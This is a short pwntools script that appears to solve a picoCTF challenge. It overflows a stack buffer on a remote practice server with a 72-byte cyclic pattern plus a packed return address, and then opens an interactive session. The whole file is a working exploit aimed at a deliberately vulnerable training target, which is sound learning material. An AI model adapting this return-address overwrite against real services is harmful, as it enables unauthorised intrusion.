from pwn import *

# io = process('./vuln')
io = remote('saturn.picoctf.net', 52104)

io.sendlineafter(b'Welcome to 64-bit. Give me a string that gets you the flag: ', 
	cyclic(64 + 8) + p64(0x40123B))
	
io.interactive()